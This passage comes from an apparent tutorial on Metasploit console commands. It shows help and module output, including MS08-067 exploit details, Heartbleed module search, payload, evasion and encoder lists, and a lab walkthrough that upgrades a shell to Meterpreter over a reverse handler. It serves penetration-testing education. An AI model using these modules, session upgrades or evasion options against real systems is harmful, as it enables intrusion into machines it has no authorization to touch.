<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; info exploit/windows/smb/ms08_067_netapi
</span><span class='line'>
</span><span class='line'>       Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
</span><span class='line'>     Module: exploit/windows/smb/ms08_067_netapi
</span><span class='line'>   Platform: Windows
</span><span class='line'> Privileged: Yes
</span><span class='line'>    License: Metasploit Framework License (BSD)
</span><span class='line'>       Rank: Great
</span><span class='line'>  Disclosed: 2008-10-28
</span><span class='line'>
</span><span class='line'>Provided by:
</span><span class='line'>  hdm &lt;x@hdm.io&gt;
</span><span class='line'>  Brett Moore &lt;brett.moore@insomniasec.com&gt;
</span><span class='line'>  frank2 &lt;frank2@dc949.org&gt;
</span><span class='line'>  jduck &lt;jduck@metasploit.com&gt;
</span><span class='line'>
</span><span class='line'>Available targets:
</span><span class='line'>  Id  Name
</span><span class='line'>  --  ----
</span><span class='line'>  0   Automatic Targeting
</span><span class='line'>  1   Windows 2000 Universal
</span><span class='line'>  2   Windows XP SP0/SP1 Universal
</span><span class='line'>  3   Windows 2003 SP0 Universal
</span><span class='line'>  4   Windows XP SP2 English (AlwaysOn NX)
</span><span class='line'>  5   Windows XP SP2 English (NX)
</span><span class='line'>  6   Windows XP SP3 English (AlwaysOn NX)
</span><span class='line'>  7   Windows XP SP3 English (NX)
</span><span class='line'>  8   Windows XP SP2 Arabic (NX)
</span><span class='line'>  9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
</span><span class='line'>  10  Windows XP SP2 Chinese - Simplified (NX)
</span><span class='line'>  11  Windows XP SP2 Chinese - Traditional (NX)
</span><span class='line'>  12  Windows XP SP2 Czech (NX)
</span><span class='line'>  13  Windows XP SP2 Danish (NX)
</span><span class='line'>  14  Windows XP SP2 German (NX)
</span><span class='line'>  15  Windows XP SP2 Greek (NX)
</span><span class='line'>  16  Windows XP SP2 Spanish (NX)
</span><span class='line'>  17  Windows XP SP2 Finnish (NX)
</span><span class='line'>  18  Windows XP SP2 French (NX)
</span><span class='line'>  19  Windows XP SP2 Hebrew (NX)
</span><span class='line'>  20  Windows XP SP2 Hungarian (NX)
</span><span class='line'>  21  Windows XP SP2 Italian (NX)
</span><span class='line'>  22  Windows XP SP2 Japanese (NX)
</span><span class='line'>  23  Windows XP SP2 Korean (NX)
</span><span class='line'>  24  Windows XP SP2 Dutch (NX)
</span><span class='line'>  25  Windows XP SP2 Norwegian (NX)
</span><span class='line'>  26  Windows XP SP2 Polish (NX)
</span><span class='line'>  27  Windows XP SP2 Portuguese - Brazilian (NX)
</span><span class='line'>  28  Windows XP SP2 Portuguese (NX)
</span><span class='line'>  29  Windows XP SP2 Russian (NX)
</span><span class='line'>  30  Windows XP SP2 Swedish (NX)
</span><span class='line'>  31  Windows XP SP2 Turkish (NX)
</span><span class='line'>  32  Windows XP SP3 Arabic (NX)
</span><span class='line'>  33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
</span><span class='line'>  34  Windows XP SP3 Chinese - Simplified (NX)
</span><span class='line'>  35  Windows XP SP3 Chinese - Traditional (NX)
</span><span class='line'>  36  Windows XP SP3 Czech (NX)
</span><span class='line'>  37  Windows XP SP3 Danish (NX)
</span><span class='line'>  38  Windows XP SP3 German (NX)
</span><span class='line'>  39  Windows XP SP3 Greek (NX)
</span><span class='line'>  40  Windows XP SP3 Spanish (NX)
</span><span class='line'>  41  Windows XP SP3 Finnish (NX)
</span><span class='line'>  42  Windows XP SP3 French (NX)
</span><span class='line'>  43  Windows XP SP3 Hebrew (NX)
</span><span class='line'>  44  Windows XP SP3 Hungarian (NX)
</span><span class='line'>  45  Windows XP SP3 Italian (NX)
</span><span class='line'>  46  Windows XP SP3 Japanese (NX)
</span><span class='line'>  47  Windows XP SP3 Korean (NX)
</span><span class='line'>  48  Windows XP SP3 Dutch (NX)
</span><span class='line'>  49  Windows XP SP3 Norwegian (NX)
</span><span class='line'>  50  Windows XP SP3 Polish (NX)
</span><span class='line'>  51  Windows XP SP3 Portuguese - Brazilian (NX)
</span><span class='line'>  52  Windows XP SP3 Portuguese (NX)
</span><span class='line'>  53  Windows XP SP3 Russian (NX)
</span><span class='line'>  54  Windows XP SP3 Swedish (NX)
</span><span class='line'>  55  Windows XP SP3 Turkish (NX)
</span><span class='line'>  56  Windows 2003 SP1 English (NO NX)
</span><span class='line'>  57  Windows 2003 SP1 English (NX)
</span><span class='line'>  58  Windows 2003 SP1 Japanese (NO NX)
</span><span class='line'>  59  Windows 2003 SP1 Spanish (NO NX)
</span><span class='line'>  60  Windows 2003 SP1 Spanish (NX)
</span><span class='line'>  61  Windows 2003 SP1 French (NO NX)
</span><span class='line'>  62  Windows 2003 SP1 French (NX)
</span><span class='line'>  63  Windows 2003 SP2 English (NO NX)
</span><span class='line'>  64  Windows 2003 SP2 English (NX)
</span><span class='line'>  65  Windows 2003 SP2 German (NO NX)
</span><span class='line'>  66  Windows 2003 SP2 German (NX)
</span><span class='line'>  67  Windows 2003 SP2 Portuguese - Brazilian (NX)
</span><span class='line'>  68  Windows 2003 SP2 Spanish (NO NX)
</span><span class='line'>  69  Windows 2003 SP2 Spanish (NX)
</span><span class='line'>  70  Windows 2003 SP2 Japanese (NO NX)
</span><span class='line'>  71  Windows 2003 SP2 French (NO NX)
</span><span class='line'>  72  Windows 2003 SP2 French (NX)
</span><span class='line'>
</span><span class='line'>Basic options:
</span><span class='line'>  Name     Current Setting  Required  Description
</span><span class='line'>  ----     ---------------  --------  -----------
</span><span class='line'>  RHOST                     yes       The target address
</span><span class='line'>  RPORT    445              yes       Set the SMB service port
</span><span class='line'>  SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
</span><span class='line'>
</span><span class='line'>Payload information:
</span><span class='line'>  Space: 410
</span><span class='line'>  Avoid: 8 characters
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  This module exploits a parsing flaw in the path canonicalization 
</span><span class='line'>  code of NetAPI32.dll through the Server Service. This module is 
</span><span class='line'>  capable of bypassing NX on some operating systems and service packs. 
</span><span class='line'>  The correct target must be used to prevent the Server Service (along 
</span><span class='line'>  with a dozen others in the same process) from crashing. Windows XP 
</span><span class='line'>  targets seem to handle multiple successful exploitation events, but 
</span><span class='line'>  2003 targets will often crash or hang on subsequent attempts. This 
</span><span class='line'>  is just the first version of this module, full support for NX bypass 
</span><span class='line'>  on 2003, along with other platforms, is still in development.
</span><span class='line'>
</span><span class='line'>References:
</span><span class='line'>  http://cvedetails.com/cve/2008-4250/
</span><span class='line'>  http://www.osvdb.org/49243
</span><span class='line'>  http://technet.microsoft.com/en-us/security/bulletin/MS08-067
</span><span class='line'>  http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>jobs</strong> &ndash; check and interact with backgrounds jobs</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; jobs -h
</span><span class='line'>Usage: jobs [options]
</span><span class='line'>
</span><span class='line'>Active job manipulation and interaction.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -K        Terminate all running jobs.
</span><span class='line'>    -h        Help banner.
</span><span class='line'>    -i &lt;opt&gt;  Lists detailed information about a running job.
</span><span class='line'>    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.
</span><span class='line'>    -l        List all running jobs.
</span><span class='line'>    -v        Print more detailed info.  Use with -i and -l</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>makerc</strong> &ndash; save the commands executed since startup to the specified file.</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; makerc demo.rc
</span><span class='line'>[*] Saving last 3 commands to demo.rc ...
</span><span class='line'>msf exploit(usermap_script) &gt; cat demo.rc
</span><span class='line'>[*] exec: cat demo.rc
</span><span class='line'>
</span><span class='line'>cat demo.rc
</span><span class='line'>clear
</span><span class='line'>sessions</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>options</strong> &ndash; displays the options of a module</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help options
</span><span class='line'>Usage: options [mod1 mod2 ...]
</span><span class='line'>
</span><span class='line'>Queries the supplied module or modules for options. If no module is given,
</span><span class='line'>show options for the currently active module.
</span><span class='line'>
</span><span class='line'>msf &gt; options
</span><span class='line'>
</span><span class='line'>Global Options:
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>   Option            Current Setting    Description
</span><span class='line'>   ------            ---------------    -----------
</span><span class='line'>   ConsoleLogging    false              Log all console input and output
</span><span class='line'>   LogLevel          0                  Verbosity of logs (default 0, max 3)
</span><span class='line'>   MinimumRank       0                  The minimum rank of exploits that will run without explicit confirmation
</span><span class='line'>   Prompt            msf                The prompt string
</span><span class='line'>   PromptChar        &gt;                  The prompt character
</span><span class='line'>   PromptTimeFormat  %Y-%m-%d %H:%M:%S  Format for timestamp escapes in prompts
</span><span class='line'>   SessionLogging    false              Log all input and output for sessions
</span><span class='line'>   TimestampOutput   false              Prefix all console output with a timestamp</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>resource</strong> &ndash; runs the commands in a file</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(telnet_login) &gt; help resource
</span><span class='line'>Usage: resource path1 [path2 ...]
</span><span class='line'>
</span><span class='line'>Run the commands stored in the supplied files.  Resource files may also contain
</span><span class='line'>ruby code between &lt;ruby&gt;&lt;/ruby&gt; tags.
</span><span class='line'>
</span><span class='line'>See also: makerc</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>route</strong> &ndash; route traffic through a session</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(telnet_login) &gt; route -h
</span><span class='line'>Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid]
</span><span class='line'>
</span><span class='line'>Route traffic destined to a given subnet through a supplied session.
</span><span class='line'>The default comm is Local.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>save</strong> &ndash; saves the current configuration</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help save
</span><span class='line'>Usage: save
</span><span class='line'>
</span><span class='line'>Save the active datastore contents to disk for automatic use across restarts of the console
</span><span class='line'>
</span><span class='line'>The configuration is stored in /root/.msf5/config</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>search</strong> &ndash; this is what you will use when searching for exploits</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help search
</span><span class='line'>Usage: search [keywords]
</span><span class='line'>
</span><span class='line'>Keywords:
</span><span class='line'>  app       :  Modules that are client or server attacks
</span><span class='line'>  author    :  Modules written by this author
</span><span class='line'>  bid       :  Modules with a matching Bugtraq ID
</span><span class='line'>  cve       :  Modules with a matching CVE ID
</span><span class='line'>  edb       :  Modules with a matching Exploit-DB ID
</span><span class='line'>  name      :  Modules with a matching descriptive name
</span><span class='line'>  osvdb     :  Modules with a matching OSVDB ID
</span><span class='line'>  platform  :  Modules affecting this platform
</span><span class='line'>  ref       :  Modules with a matching ref
</span><span class='line'>  type      :  Modules of a specific type (exploit, auxiliary, or post)
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  search cve:2009 type:exploit app:client
</span><span class='line'>
</span><span class='line'>msf &gt; search heartbleed
</span><span class='line'>
</span><span class='line'>Matching Modules
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>   Name                                              Disclosure Date  Rank    Description
</span><span class='line'>   ----                                              ---------------  ----    -----------
</span><span class='line'>   auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Information Leak
</span><span class='line'>   auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Client Memory Exposure</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>sessions</strong> &ndash; interact with sessions</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; sessions -h
</span><span class='line'>Usage: sessions [options]
</span><span class='line'>
</span><span class='line'>Active session manipulation and interaction.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -K        Terminate all sessions
</span><span class='line'>    -c &lt;opt&gt;  Run a command on the session given with -i, or all
</span><span class='line'>    -h        Help banner
</span><span class='line'>    -i &lt;opt&gt;  Interact with the supplied session ID
</span><span class='line'>    -k &lt;opt&gt;  Terminate sessions by session ID and/or range
</span><span class='line'>    -l        List all active sessions
</span><span class='line'>    -q        Quiet mode
</span><span class='line'>    -r        Reset the ring buffer for the session given with -i, or all
</span><span class='line'>    -s &lt;opt&gt;  Run a script on the session given with -i, or all
</span><span class='line'>    -t &lt;opt&gt;  Set a response timeout (default: 15)
</span><span class='line'>    -u &lt;opt&gt;  Upgrade a shell to a meterpreter session on many platforms
</span><span class='line'>    -v        List verbose fields
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Many options allow specifying session ranges using commas and dashes.
</span><span class='line'>For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6</span></code></pre></td></tr></table></div></figure>


<p>In the following example I am upgrading the shell of a session to Meterpreter:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; sessions
</span><span class='line'>
</span><span class='line'>Active sessions
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>  Id  Type        Information  Connection
</span><span class='line'>  --  ----        -----------  ----------
</span><span class='line'>  1   shell unix               192.168.80.155:34501 -&gt; 192.168.80.156:4444 (192.168.80.156)
</span><span class='line'>
</span><span class='line'>msf exploit(usermap_script) &gt; sessions -u 1
</span><span class='line'>[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
</span><span class='line'>
</span><span class='line'>[*] Upgrading session ID: 1
</span><span class='line'>[*] Starting exploit/multi/handler
</span><span class='line'>[*] Started reverse TCP handler on 192.168.80.155:4433 
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
</span><span class='line'>[*] Sending stage (1495599 bytes) to 192.168.80.156
</span><span class='line'>[*] Command stager progress: 100.00% (668/668 bytes)
</span><span class='line'>msf exploit(usermap_script) &gt; [*] Meterpreter session 2 opened (192.168.80.155:4433 -&gt; 192.168.80.156:58435) at 2016-06-02 13:53:36 -0400</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>set</strong>, <strong>setg</strong> &ndash; sets value to option (g for global variables). You will do lots of setting as you tweak your exploits :p</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help set
</span><span class='line'>Usage: set [option] [value]
</span><span class='line'>
</span><span class='line'>Set the given option to value.  If value is omitted, print the current value.
</span><span class='line'>If both are omitted, print options that are currently set.
</span><span class='line'>
</span><span class='line'>If run from a module context, this will set the value in the module's
</span><span class='line'>datastore.  Use -g to operate on the global datastore
</span><span class='line'>
</span><span class='line'>msf &gt; setg
</span><span class='line'>
</span><span class='line'>Global
</span><span class='line'>======
</span><span class='line'>
</span><span class='line'>  Name   Value
</span><span class='line'>  ----   -----
</span><span class='line'>  RHOST  192.168.80.156</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>show</strong> &ndash; displays various information as needed</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help show
</span><span class='line'>[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options
</span><span class='line'>[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions</span></code></pre></td></tr></table></div></figure>


<p>The options that we need to edit when setting up exploits:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms08_067_netapi) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/windows/smb/ms08_067_netapi):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   RHOST    192.168.80.156   yes       The target address
</span><span class='line'>   RPORT    445              yes       Set the SMB service port
</span><span class='line'>   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic Targeting</span></code></pre></td></tr></table></div></figure>


<p>A couple of payloads:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms08_067_netapi) &gt; show payloads
</span><span class='line'>
</span><span class='line'>Compatible Payloads
</span><span class='line'>===================
</span><span class='line'>
</span><span class='line'>   Name                                                Disclosure Date  Rank    Description
</span><span class='line'>   ----                                                ---------------  ----    -----------
</span><span class='line'>   generic/custom                                                       normal  Custom Payload
</span><span class='line'>   generic/debug_trap                                                   normal  Generic x86 Debug Trap
</span><span class='line'>   generic/shell_bind_tcp                                               normal  Generic Command Shell, Bind TCP Inline
</span><span class='line'>   generic/shell_reverse_tcp                                            normal  Generic Command Shell, Reverse TCP Inline
</span><span class='line'>   generic/tight_loop                                                   normal  Generic x86 Tight Loop
</span><span class='line'>   windows/adduser                                                      normal  Windows Execute net user /ADD
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h3>Evasion</h3>

<p>For the evasion options available for each module, you can use the command <strong>show evasion</strong>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(advantech_switch_bash_env_exec) &gt; show evasion
</span><span class='line'>
</span><span class='line'>Module evasion options:
</span><span class='line'>
</span><span class='line'>   Name           : HTTP::header_folding
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Enable folding of HTTP headers
</span><span class='line'>
</span><span class='line'>   Name           : HTTP::method_random_case
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Use random casing for the HTTP method
</span><span class='line'>
</span><span class='line'>   Name           : HTTP::method_random_invalid
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Use a random invalid, HTTP method for request
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h3>Encoders</h3>

<p>Metasploit automatically selects the best encoder for the job given the selected criteria. If you want to use a specific encoder, you can select one from the multitude available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf payload(generic) &gt; show encoders
</span><span class='line'>
</span><span class='line'>Encoders
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>   Name                          Disclosure Date  Rank       Description
</span><span class='line'>   ----                          ---------------  ----       -----------
</span><span class='line'>   cmd/echo                                       good       Echo Command Encoder
</span><span class='line'>   cmd/generic_sh                                 manual     Generic Shell Variable Substitution Command Encoder
</span><span class='line'>   cmd/ifs                                        low        Generic ${IFS} Substitution Command Encoder
</span><span class='line'>   cmd/perl                                       normal     Perl Command Encoder
</span><span class='line'>   cmd/powershell_base64                          excellent  Powershell Base64 Command Encoder
</span><span class='line'>   cmd/printf_php_mq                              manual     printf(1) via PHP magic_quotes Utility Command Encoder
</span><span class='line'>   generic/eicar                                  manual     The EICAR Encoder
</span><span class='line'>   generic/none                                   normal     The "none" Encoder
</span><span class='line'>   mipsbe/byte_xori                               normal     Byte XORi Encoder
</span><span class='line'>   mipsbe/longxor                                 normal     XOR Encoder
</span><span class='line'>   mipsle/byte_xori                               normal     Byte XORi Encoder
</span><span class='line'>   mipsle/longxor                                 normal     XOR Encoder
</span><span class='line'>   php/base64                                     great      PHP Base64 Encoder
</span><span class='line'>   ppc/longxor                                    normal     PPC LongXOR Encoder
</span><span class='line'>   ppc/longxor_tag                                normal     PPC LongXOR Encoder
</span><span class='line'>   sparc/longxor_tag                              normal     SPARC DWORD XOR Encoder
</span><span class='line'>   x64/xor                                        normal     XOR Encoder
</span><span class='line'>   x86/add_sub                                    manual     Add/Sub Encoder
</span><span class='line'>   x86/alpha_mixed                                low        Alpha2 Alphanumeric Mixedcase Encoder
</span><span class='line'>   x86/alpha_upper                                low        Alpha2 Alphanumeric Uppercase Encoder
</span><span class='line'>   x86/avoid_underscore_tolower                   manual     Avoid underscore/tolower
</span><span class='line'>   x86/avoid_utf8_tolower                         manual     Avoid UTF8/tolower
